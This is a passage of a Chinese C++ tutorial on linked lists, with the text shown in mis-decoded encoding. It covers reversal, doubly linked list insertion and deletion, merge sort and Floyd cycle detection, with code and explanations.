ç»“æœï¼šnullptr &lt;- 1 &lt;- 2 &lt;- 3

è¿”å›<span class="hljs-attr">prev</span> = <span class="hljs-number">3</span>ï¼Œå³æ–°é“¾è¡¨çš„å¤´èŠ‚ç‚¹
</code></pre>
<h3 data-id="heading-11">2.3 ä¸ºä»€ä¹ˆè¿™ä¸ªç®—æ³•æ­£ç¡®ï¼Ÿ</h3>
<ol>
<li><strong>ä¿å­˜nextæ˜¯å¿…é¡»çš„</strong>ï¼šä¸€æ—¦æ‰§è¡Œ<code>curr-&gt;next = prev</code>ï¼Œå°±ä¸¢å¤±äº†åŸé“¾è¡¨çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</li>
<li><strong>ç§»åŠ¨æŒ‡é’ˆçš„é¡ºåº</strong>ï¼šå¿…é¡»å…ˆç§»åŠ¨prevåˆ°currï¼Œå†ç§»åŠ¨curråˆ°next</li>
<li><strong>ç»ˆæ­¢æ¡ä»¶</strong>ï¼šå½“currä¸ºnullptræ—¶ï¼ŒprevæŒ‡å‘åŸé“¾è¡¨çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œå³æ–°é“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</li>
</ol>
<h3 data-id="heading-12">2.4 é€’å½’åè½¬æ³•</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">reverseRecursive</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-comment">// é€’å½’ç»ˆæ­¢æ¡ä»¶ï¼šç©ºé“¾è¡¨æˆ–å•ä¸ªèŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (!head || !head-&gt;next) {
        <span class="hljs-keyword">return</span> head;
    }
    
    <span class="hljs-comment">// é€’å½’åè½¬å‰©ä½™éƒ¨åˆ†</span>
    ListNode* newHead = <span class="hljs-built_in">reverseRecursive</span>(head-&gt;next);
    
    <span class="hljs-comment">// å…³é”®æ“ä½œï¼šè®©ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æŒ‡å‘è‡ªå·±</span>
    head-&gt;next-&gt;next = head;
    <span class="hljs-comment">// æ–­å¼€è‡ªå·±çš„nextæŒ‡é’ˆï¼ˆå¦åˆ™ä¼šæˆç¯ï¼‰</span>
    head-&gt;next = <span class="hljs-literal">nullptr</span>;
    
    <span class="hljs-keyword">return</span> newHead;
}
</code></pre>
<h4 data-id="heading-13">é€’å½’æ·±åº¦åˆ†æï¼ˆé“¾è¡¨ï¼š1-&gt;2-&gt;3ï¼‰</h4>
<pre><code class="hljs language-rust" lang="rust">è°ƒç”¨æ ˆï¼š
<span class="hljs-title function_ invoke__">reverse</span>(<span class="hljs-number">1</span>)
  <span class="hljs-title function_ invoke__">reverse</span>(<span class="hljs-number">2</span>)
    <span class="hljs-title function_ invoke__">reverse</span>(<span class="hljs-number">3</span>) <span class="hljs-punctuation">-&gt;</span> è¿”å›<span class="hljs-number">3</span>
    
<span class="hljs-title function_ invoke__">reverse</span>(<span class="hljs-number">2</span>)å±‚ï¼š
  newHead = <span class="hljs-number">3</span>
  <span class="hljs-number">2</span><span class="hljs-punctuation">-&gt;</span><span class="hljs-number">3</span><span class="hljs-punctuation">-&gt;</span><span class="hljs-number">2</span>ï¼ˆå½¢æˆç¯ï¼‰
  <span class="hljs-number">2</span><span class="hljs-punctuation">-&gt;</span>next = nullptr
  è¿”å›<span class="hljs-number">3</span><span class="hljs-punctuation">-&gt;</span><span class="hljs-number">2</span>
    
<span class="hljs-title function_ invoke__">reverse</span>(<span class="hljs-number">1</span>)å±‚ï¼š
  newHead = <span class="hljs-number">3</span><span class="hljs-punctuation">-&gt;</span><span class="hljs-number">2</span>
  <span class="hljs-number">1</span><span class="hljs-punctuation">-&gt;</span><span class="hljs-number">2</span><span class="hljs-punctuation">-&gt;</span><span class="hljs-number">1</span>ï¼ˆå½¢æˆç¯ï¼‰
  <span class="hljs-number">1</span><span class="hljs-punctuation">-&gt;</span>next = nullptr
  è¿”å›<span class="hljs-number">3</span><span class="hljs-punctuation">-&gt;</span><span class="hljs-number">2</span><span class="hljs-punctuation">-&gt;</span><span class="hljs-number">1</span>
</code></pre>
<h3 data-id="heading-14">2.5 ä½¿ç”¨æ ˆè¾…åŠ©åè½¬ï¼ˆç†è§£ç”¨ï¼‰</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">reverseWithStack</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-keyword">if</span> (!head) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
    
    stack&lt;ListNode*&gt; st;
    ListNode* curr = head;
    
    <span class="hljs-comment">// æ‰€æœ‰èŠ‚ç‚¹å…¥æ ˆ</span>
    <span class="hljs-keyword">while</span> (curr) {
        st.<span class="hljs-built_in">push</span>(curr);
        curr = curr-&gt;next;
    }
    
    <span class="hljs-comment">// æ ˆé¡¶æ˜¯åŸé“¾è¡¨çš„å°¾èŠ‚ç‚¹ï¼Œä½œä¸ºæ–°é“¾è¡¨çš„å¤´</span>
    ListNode* newHead = st.<span class="hljs-built_in">top</span>();
    st.<span class="hljs-built_in">pop</span>();
    curr = newHead;
    
    <span class="hljs-comment">// ä¾æ¬¡å‡ºæ ˆå¹¶è¿æ¥</span>
    <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) {
        curr-&gt;next = st.<span class="hljs-built_in">top</span>();
        st.<span class="hljs-built_in">pop</span>();
        curr = curr-&gt;next;
    }
    
    <span class="hljs-comment">// å…³é”®ï¼šæœ€åä¸€ä¸ªèŠ‚ç‚¹çš„nextç½®ç©º</span>
    curr-&gt;next = <span class="hljs-literal">nullptr</span>;
    
    <span class="hljs-keyword">return</span> newHead;
}
</code></pre>
<p><strong>ç¼ºç‚¹</strong>ï¼šéœ€è¦O(n)é¢å¤–ç©ºé—´ï¼Œæ•ˆç‡ä¸å¦‚è¿­ä»£æ³•</p>
<h2 data-id="heading-15">ä¸‰ã€åŒé“¾è¡¨è¯¦è§£ï¼šåŒå‘å…³ç³»ç®¡ç†</h2>
<h3 data-id="heading-16">3.1 åŒé“¾è¡¨èŠ‚ç‚¹ç»“æ„</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">DListNode</span> {
    <span class="hljs-type">int</span> val;
    DListNode* prev;  <span class="hljs-comment">// æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹</span>
    DListNode* next;  <span class="hljs-comment">// æŒ‡å‘åä¸€ä¸ªèŠ‚ç‚¹</span>
    
    <span class="hljs-built_in">DListNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">prev</span>(<span class="hljs-literal">nullptr</span>), <span class="hljs-built_in">next</span>(<span class="hljs-literal">nullptr</span>) {}
};
</code></pre>
<p><strong>ä¸å•é“¾è¡¨çš„åŒºåˆ«</strong>ï¼š</p>
<ul>
<li>å¤šäº†ä¸€ä¸ª<code>prev</code>æŒ‡é’ˆï¼ŒæŒ‡å‘å‰é©±èŠ‚ç‚¹</li>
<li>å¯ä»¥åŒå‘éå†ï¼šä»å¤´åˆ°å°¾æˆ–ä»å°¾åˆ°å¤´</li>
<li>åˆ é™¤æ“ä½œæ›´ç®€å•ï¼ˆä¸éœ€è¦æ‰¾åˆ°å‰é©±èŠ‚ç‚¹ï¼‰</li>
</ul>
<h3 data-id="heading-17">3.2 åŒé“¾è¡¨çš„ä¼˜åŠ¿ä¸ä»£ä»·</h3>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ol>
<li>åŒå‘éå†ï¼šå¯ä»¥ä»ä»»æ„èŠ‚ç‚¹å‘å‰æˆ–å‘åéå†</li>
<li>åˆ é™¤æ“ä½œç®€å•ï¼šä¸éœ€è¦å¯»æ‰¾å‰é©±èŠ‚ç‚¹</li>
<li>æŸäº›æ“ä½œæ›´é«˜æ•ˆï¼šå¦‚åˆ é™¤å°¾èŠ‚ç‚¹åªéœ€O(1)</li>
</ol>
<p><strong>ä»£ä»·</strong>ï¼š</p>
<ol>
<li>æ¯ä¸ªèŠ‚ç‚¹å¤šä¸€ä¸ªæŒ‡é’ˆï¼Œå†…å­˜å ç”¨å¢åŠ </li>
<li>æ’å…¥/åˆ é™¤æ—¶éœ€è¦ç»´æŠ¤ä¸¤ä¸ªæŒ‡é’ˆï¼Œä»£ç ç¨å¤æ‚</li>
<li>éœ€è¦æ›´å¤šçš„æŒ‡é’ˆæ“ä½œï¼Œå®¹æ˜“å‡ºé”™</li>
</ol>
<h3 data-id="heading-18">3.3 åŒé“¾è¡¨æ’å…¥æ“ä½œ</h3>
<h4 data-id="heading-19">åœ¨å¤´éƒ¨æ’å…¥</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insertAtHead</span><span class="hljs-params">(DListNode*&amp; head, DListNode*&amp; tail, <span class="hljs-type">int</span> val)</span> </span>{
    DListNode* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DListNode</span>(val);
    
    <span class="hljs-keyword">if</span> (!head) {  <span class="hljs-comment">// ç©ºé“¾è¡¨</span>
        head = tail = newNode;
    } <span class="hljs-keyword">else</span> {
        newNode-&gt;next = head;
        head-&gt;prev = newNode;
        head = newNode;
    }
}
</code></pre>
<h4 data-id="heading-20">åœ¨å°¾éƒ¨æ’å…¥</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insertAtTail</span><span class="hljs-params">(DListNode*&amp; head, DListNode*&amp; tail, <span class="hljs-type">int</span> val)</span> </span>{
    DListNode* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DListNode</span>(val);
    
    <span class="hljs-keyword">if</span> (!tail) {  <span class="hljs-comment">// ç©ºé“¾è¡¨</span>
        head = tail = newNode;
    } <span class="hljs-keyword">else</span> {
        tail-&gt;next = newNode;
        newNode-&gt;prev = tail;
        tail = newNode;
    }
}
</code></pre>
<h4 data-id="heading-21">åœ¨æŒ‡å®šèŠ‚ç‚¹åæ’å…¥</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insertAfter</span><span class="hljs-params">(DListNode* node, <span class="hljs-type">int</span> val)</span> </span>{
    <span class="hljs-keyword">if</span> (!node) <span class="hljs-keyword">return</span>;
    
    DListNode* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DListNode</span>(val);
    
    <span class="hljs-comment">// è¿æ¥æ–°èŠ‚ç‚¹ä¸åç»§èŠ‚ç‚¹</span>
    newNode-&gt;next = node-&gt;next;
    <span class="hljs-keyword">if</span> (node-&gt;next) {
        node-&gt;next-&gt;prev = newNode;
    }
    
    <span class="hljs-comment">// è¿æ¥æ–°èŠ‚ç‚¹ä¸å‰é©±èŠ‚ç‚¹</span>
    newNode-&gt;prev = node;
    node-&gt;next = newNode;
}
</code></pre>
<h3 data-id="heading-22">3.4 åŒé“¾è¡¨åˆ é™¤æ“ä½œï¼ˆé‡ç‚¹ï¼‰</h3>
<h4 data-id="heading-23">åˆ é™¤èŠ‚ç‚¹çš„ä¸‰ç§æƒ…å†µ</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteNode</span><span class="hljs-params">(DListNode*&amp; head, DListNode*&amp; tail, DListNode* target)</span> </span>{
    <span class="hljs-keyword">if</span> (!head || !target) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// è¾¹ç•Œæ£€æŸ¥</span>
    
    <span class="hljs-comment">// æƒ…å†µ1ï¼šåˆ é™¤å¤´èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (target == head) {
        head = head-&gt;next;        <span class="hljs-comment">// å¤´æŒ‡é’ˆåç§»</span>
        <span class="hljs-keyword">if</span> (head) {
            head-&gt;prev = <span class="hljs-literal">nullptr</span>; <span class="hljs-comment">// æ–°å¤´èŠ‚ç‚¹çš„prevç½®ç©º</span>
        } <span class="hljs-keyword">else</span> {
            tail = <span class="hljs-literal">nullptr</span>;       <span class="hljs-comment">// é“¾è¡¨å˜ç©ºï¼Œå°¾æŒ‡é’ˆä¹Ÿç½®ç©º</span>
        }
    }
    <span class="hljs-comment">// æƒ…å†µ2ï¼šåˆ é™¤å°¾èŠ‚ç‚¹</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target == tail) {
        tail = tail-&gt;prev;        <span class="hljs-comment">// å°¾æŒ‡é’ˆå‰ç§»</span>
        <span class="hljs-keyword">if</span> (tail) {
            tail-&gt;next = <span class="hljs-literal">nullptr</span>; <span class="hljs-comment">// æ–°å°¾èŠ‚ç‚¹çš„nextç½®ç©º</span>
        } <span class="hljs-keyword">else</span> {
            head = <span class="hljs-literal">nullptr</span>;       <span class="hljs-comment">// é“¾è¡¨å˜ç©ºï¼Œå¤´æŒ‡é’ˆä¹Ÿç½®ç©º</span>
        }
    }
    <span class="hljs-comment">// æƒ…å†µ3ï¼šåˆ é™¤ä¸­é—´èŠ‚ç‚¹</span>
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è·³è¿‡è¦åˆ é™¤çš„èŠ‚ç‚¹</span>
        target-&gt;prev-&gt;next = target-&gt;next;
        target-&gt;next-&gt;prev = target-&gt;prev;
    }
    
    <span class="hljs-keyword">delete</span> target;  <span class="hljs-comment">// é‡Šæ”¾å†…å­˜</span>
}
</code></pre>
<h4 data-id="heading-24">å›¾è§£åˆ é™¤è¿‡ç¨‹</h4>
<pre><code class="hljs language-css" lang="css">åˆ é™¤ä¸­é—´èŠ‚ç‚¹<span class="hljs-selector-tag">B</span>ï¼š<span class="hljs-selector-tag">A</span> &lt;-&gt; <span class="hljs-selector-tag">B</span> &lt;-&gt; C

æ­¥éª¤<span class="hljs-number">1</span>ï¼š<span class="hljs-selector-tag">A</span>-&gt;next = C
<span class="hljs-selector-tag">A</span> &lt;-&gt; C  <span class="hljs-selector-tag">B</span> &lt;-&gt; C

æ­¥éª¤<span class="hljs-number">2</span>ï¼šC-&gt;prev = <span class="hljs-selector-tag">A</span>
<span class="hljs-selector-tag">A</span> &lt;-&gt; C  <span class="hljs-selector-tag">B</span>å­¤ç«‹

æ­¥éª¤<span class="hljs-number">3</span>ï¼šdelete <span class="hljs-selector-tag">B</span>
<span class="hljs-selector-tag">A</span> &lt;-&gt; C
</code></pre>
<h4 data-id="heading-25">åˆ é™¤æ“ä½œçš„æ³¨æ„äº‹é¡¹</h4>
<ol>
<li>
<p><strong>æ›´æ–°ç›¸é‚»èŠ‚ç‚¹çš„æŒ‡é’ˆ</strong>ï¼š</p>
<ul>
<li>å‰é©±èŠ‚ç‚¹çš„nextæŒ‡å‘åç»§èŠ‚ç‚¹</li>
<li>åç»§èŠ‚ç‚¹çš„prevæŒ‡å‘å‰é©±èŠ‚ç‚¹</li>
</ul>
</li>
<li>
<p><strong>å¤„ç†è¾¹ç•Œæƒ…å†µ</strong>ï¼š</p>
<ul>
<li>åˆ é™¤å¤´èŠ‚ç‚¹ï¼šæ›´æ–°headæŒ‡é’ˆ</li>
<li>åˆ é™¤å°¾èŠ‚ç‚¹ï¼šæ›´æ–°tailæŒ‡é’ˆ</li>
<li>åˆ é™¤å”¯ä¸€èŠ‚ç‚¹ï¼šheadå’Œtailéƒ½ç½®ç©º</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†</strong>ï¼šè®°å¾—deleteé‡Šæ”¾å†…å­˜</p>
</li>
</ol>
<h3 data-id="heading-26">3.5 æŒ‰å€¼åˆ é™¤</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteByValue</span><span class="hljs-params">(DListNode*&amp; head, DListNode*&amp; tail, <span class="hljs-type">int</span> val)</span> </span>{
    DListNode* curr = head;
    
    <span class="hljs-keyword">while</span> (curr) {
        <span class="hljs-keyword">if</span> (curr-&gt;val == val) {
            DListNode* toDelete = curr;
            curr = curr-&gt;next;  <span class="hljs-comment">// å…ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span>
            
            <span class="hljs-built_in">deleteNode</span>(head, tail, toDelete);
        } <span class="hljs-keyword">else</span> {
            curr = curr-&gt;next;
        }
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼šåœ¨åˆ é™¤èŠ‚ç‚¹å‰ï¼Œå…ˆä¿å­˜ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦åˆ™åˆ é™¤åæ— æ³•ç»§ç»­éå†ã€‚</p>
<h2 data-id="heading-27">å››ã€é“¾è¡¨æ’åºï¼šå½’å¹¶æ’åºçš„å®ç°</h2>
<h3 data-id="heading-28">4.1 ä¸ºä»€ä¹ˆé“¾è¡¨æ’åºç”¨å½’å¹¶ï¼Ÿ</h3>
<p>é“¾è¡¨ä¸æ•°ç»„ä¸åŒï¼š</p>
<ol>
<li><strong>ä¸æ”¯æŒéšæœºè®¿é—®</strong>ï¼šä¸èƒ½åƒæ•°ç»„é‚£æ ·ç”¨ä¸‹æ ‡ç›´æ¥è®¿é—®ä»»æ„å…ƒç´ </li>
<li><strong>ç§»åŠ¨å…ƒç´ ä»£ä»·ä½</strong>ï¼šåªéœ€ä¿®æ”¹æŒ‡é’ˆï¼Œä¸éœ€è¦å¤åˆ¶æ•°æ®</li>
<li><strong>å½’å¹¶æ’åºç‰¹ç‚¹</strong>ï¼šé€‚åˆé¡ºåºè®¿é—®çš„æ•°æ®ç»“æ„</li>
</ol>
<h3 data-id="heading-29">4.2 å½’å¹¶æ’åºçš„å®Œæ•´å®ç°</h3>
<h4 data-id="heading-30">æ­¥éª¤1ï¼šæ‰¾åˆ°ä¸­é—´èŠ‚ç‚¹ï¼ˆå¿«æ…¢æŒ‡é’ˆï¼‰</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">getMiddle</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-keyword">if</span> (!head) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
    
    ListNode* slow = head;
    ListNode* fast = head-&gt;next;  <span class="hljs-comment">// fastä»head-&gt;nextå¼€å§‹</span>
    
    <span class="hljs-comment">// fastèµ°ä¸¤æ­¥ï¼Œslowèµ°ä¸€æ­¥</span>
    <span class="hljs-keyword">while</span> (fast &amp;&amp; fast-&gt;next) {
        slow = slow-&gt;next;
        fast = fast-&gt;next-&gt;next;
    }
    
    <span class="hljs-keyword">return</span> slow;  <span class="hljs-comment">// slowæŒ‡å‘ä¸­é—´èŠ‚ç‚¹</span>
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆfastä»head-&gt;nextå¼€å§‹ï¼Ÿ</strong></p>
<ul>
<li>å¯¹äºå¶æ•°ä¸ªèŠ‚ç‚¹ï¼š1-&gt;2-&gt;3-&gt;4</li>
<li>fastä»headå¼€å§‹ï¼šslowæŒ‡å‘3ï¼ˆç¬¬äºŒä¸ªä¸­é—´èŠ‚ç‚¹ï¼‰</li>
<li>fastä»head-&gt;nextå¼€å§‹ï¼šslowæŒ‡å‘2ï¼ˆç¬¬ä¸€ä¸ªä¸­é—´èŠ‚ç‚¹ï¼‰</li>
<li>æˆ‘ä»¬é€šå¸¸å¸Œæœ›åˆ†å‰²å¾—å°½é‡å‡åŒ€</li>
</ul>
<h4 data-id="heading-31">æ­¥éª¤2ï¼šé€’å½’æ’åº</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">mergeSort</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-comment">// é€’å½’ç»ˆæ­¢æ¡ä»¶ï¼šç©ºé“¾è¡¨æˆ–å•ä¸ªèŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (!head || !head-&gt;next) <span class="hljs-keyword">return</span> head;
    
    <span class="hljs-comment">// 1. æ‰¾åˆ°ä¸­é—´èŠ‚ç‚¹å¹¶åˆ†å‰²</span>
    ListNode* mid = <span class="hljs-built_in">getMiddle</span>(head);
    ListNode* right = mid-&gt;next;
    mid-&gt;next = <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// å…³é”®ï¼šåˆ‡æ–­é“¾è¡¨</span>
    
    <span class="hljs-comment">// 2. é€’å½’æ’åºå·¦å³ä¸¤éƒ¨åˆ†</span>
    ListNode* leftSorted = <span class="hljs-built_in">mergeSort</span>(head);
    ListNode* rightSorted = <span class="hljs-built_in">mergeSort</span>(right);
    
    <span class="hljs-comment">// 3. åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">merge</span>(leftSorted, rightSorted);
}
</code></pre>
<h4 data-id="heading-32">æ­¥éª¤3ï¼šåˆå¹¶æœ‰åºé“¾è¡¨</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">merge</span><span class="hljs-params">(ListNode* l1, ListNode* l2)</span> </span>{
    <span class="hljs-function">ListNode <span class="hljs-title">dummy</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;  <span class="hljs-comment">// å“‘èŠ‚ç‚¹ï¼Œç®€åŒ–æ“ä½œ</span>
    ListNode* tail = &amp;dummy;
    
    <span class="hljs-comment">// æ¯”è¾ƒä¸¤ä¸ªé“¾è¡¨çš„å¤´èŠ‚ç‚¹ï¼Œé€‰æ‹©è¾ƒå°çš„</span>
    <span class="hljs-keyword">while</span> (l1 &amp;&amp; l2) {
        <span class="hljs-keyword">if</span> (l1-&gt;val &lt; l2-&gt;val) {
            tail-&gt;next = l1;
            l1 = l1-&gt;next;
        } <span class="hljs-keyword">else</span> {
            tail-&gt;next = l2;
            l2 = l2-&gt;next;
        }
        tail = tail-&gt;next;
    }
    
    <span class="hljs-comment">// è¿æ¥å‰©ä½™éƒ¨åˆ†</span>
    tail-&gt;next = l1 ? l1 : l2;
    
    <span class="hljs-keyword">return</span> dummy.next;
}
</code></pre>
<h3 data-id="heading-33">4.3 æ—¶é—´å¤æ‚åº¦åˆ†æ</h3>
<ol>
<li>
<p><strong>åˆ†å‰²é˜¶æ®µ</strong>ï¼š</p>
<ul>
<li>æ¯æ¬¡åˆ†å‰²éœ€è¦æ‰¾åˆ°ä¸­é—´èŠ‚ç‚¹ï¼šO(n)</li>
<li>å…±åˆ†å‰²logâ‚‚næ¬¡</li>
<li>æ€»åˆ†å‰²æ—¶é—´ï¼šO(n log n)</li>
</ul>
</li>
<li>
<p><strong>åˆå¹¶é˜¶æ®µ</strong>ï¼š</p>
<ul>
<li>æ¯æ¬¡åˆå¹¶éœ€è¦éå†æ‰€æœ‰èŠ‚ç‚¹ï¼šO(n)</li>
<li>å…±åˆå¹¶logâ‚‚næ¬¡</li>
<li>æ€»åˆå¹¶æ—¶é—´ï¼šO(n log n)</li>
</ul>
</li>
</ol>
<p><strong>æ€»æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(n log n)</p>
<p><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼š</p>
<ul>
<li>é€’å½’æ ˆæ·±åº¦ï¼šO(log n)</li>
<li>ä¸éœ€è¦é¢å¤–æ•°ç»„ï¼šO(1)é¢å¤–ç©ºé—´</li>
</ul>
<h3 data-id="heading-34">4.4 å½’å¹¶æ’åºçš„å˜ç§ï¼šè‡ªåº•å‘ä¸Š</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">mergeSortBottomUp</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-keyword">if</span> (!head || !head-&gt;next) <span class="hljs-keyword">return</span> head;
    
    <span class="hljs-comment">// 1. è®¡ç®—é“¾è¡¨é•¿åº¦</span>
    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;
    ListNode* curr = head;
    <span class="hljs-keyword">while</span> (curr) {
        length++;
        curr = curr-&gt;next;
    }
    
    <span class="hljs-function">ListNode <span class="hljs-title">dummy</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;
    dummy.next = head;
    
    <span class="hljs-comment">// 2. ä»1å¼€å§‹ï¼Œæ¯æ¬¡åˆå¹¶ç›¸é‚»çš„å­é“¾è¡¨</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> step = <span class="hljs-number">1</span>; step &lt; length; step *= <span class="hljs-number">2</span>) {
        ListNode* prev = &amp;dummy;
        ListNode* curr = dummy.next;
        
        <span class="hljs-keyword">while</span> (curr) {
            <span class="hljs-comment">// è·å–ç¬¬ä¸€ä¸ªå­é“¾è¡¨</span>
            ListNode* left = curr;
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; step &amp;&amp; curr-&gt;next; i++) {
                curr = curr-&gt;next;
            }
            
            <span class="hljs-comment">// è·å–ç¬¬äºŒä¸ªå­é“¾è¡¨</span>
            ListNode* right = curr-&gt;next;
            curr-&gt;next = <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// æ–­å¼€ç¬¬ä¸€ä¸ªå­é“¾è¡¨</span>
            curr = right;
            
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; step &amp;&amp; curr &amp;&amp; curr-&gt;next; i++) {
                curr = curr-&gt;next;
            }
            
            <span class="hljs-comment">// ä¿å­˜ä¸‹ä¸€ä¸ªå­é“¾è¡¨çš„èµ·å§‹ä½ç½®</span>
            ListNode* next = <span class="hljs-literal">nullptr</span>;
            <span class="hljs-keyword">if</span> (curr) {
                next = curr-&gt;next;
                curr-&gt;next = <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// æ–­å¼€ç¬¬äºŒä¸ªå­é“¾è¡¨</span>
            }
            
            <span class="hljs-comment">// åˆå¹¶ä¸¤ä¸ªå­é“¾è¡¨</span>
            ListNode* merged = <span class="hljs-built_in">merge</span>(left, right);
            
            <span class="hljs-comment">// è¿æ¥åˆ°å·²åˆå¹¶çš„éƒ¨åˆ†</span>
            prev-&gt;next = merged;
            <span class="hljs-keyword">while</span> (prev-&gt;next) {
                prev = prev-&gt;next;
            }
            
            <span class="hljs-comment">// ç»§ç»­å¤„ç†å‰©ä½™éƒ¨åˆ†</span>
            curr = next;
        }
    }
    
    <span class="hljs-keyword">return</span> dummy.next;
}
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼šé¿å…é€’å½’ï¼Œç©ºé—´å¤æ‚åº¦O(1)</p>
<h2 data-id="heading-35">äº”ã€é“¾è¡¨å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-36">5.1 æ£€æµ‹ç¯ï¼ˆå¿«æ…¢æŒ‡é’ˆï¼‰</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-keyword">if</span> (!head || !head-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    ListNode* slow = head;
    ListNode* fast = head;
    
    <span class="hljs-keyword">while</span> (fast &amp;&amp; fast-&gt;next) {
        slow = slow-&gt;next;        <span class="hljs-comment">// æ…¢æŒ‡é’ˆèµ°ä¸€æ­¥</span>
        fast = fast-&gt;next-&gt;next;  <span class="hljs-comment">// å¿«æŒ‡é’ˆèµ°ä¸¤æ­¥</span>
        
        <span class="hljs-keyword">if</span> (slow == fast) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// ç›¸é‡è¯´æ˜æœ‰ç¯</span>
        }
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// å¿«æŒ‡é’ˆåˆ°è¾¾nullptrï¼Œè¯´æ˜æ— ç¯</span>
}
</code></pre>
<h3 data-id="heading-37">5.2 æ‰¾åˆ°ç¯çš„å…¥å£</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-keyword">if</span> (!head || !head-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
    
    ListNode* slow = head;
    ListNode* fast = head;
    <span class="hljs-type">bool</span> hasCycle = <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ˜¯å¦æœ‰ç¯</span>
    <span class="hljs-keyword">while</span> (fast &amp;&amp; fast-&gt;next) {
        slow = slow-&gt;next;
        fast = fast-&gt;next-&gt;next;
        
        <span class="hljs-keyword">if</span> (slow == fast) {
            hasCycle = <span class="hljs-literal">true</span>;
            <span class="hljs-keyword">break</span>;
        }
    }
    
    <span class="hljs-keyword">if</span> (!hasCycle) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
    
    <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šæ‰¾åˆ°ç¯çš„å…¥å£</span>
    slow = head;
    <span class="hljs-keyword">while</span> (slow != fast) {
        slow = slow-&gt;next;
        fast = fast-&gt;next;
    }
    
    <span class="hljs-keyword">return</span> slow;
}
</code></pre>
<p><strong>åŸç†</strong>ï¼ˆFloydåˆ¤åœˆç®—æ³•ï¼‰ï¼š</p>
<ol>
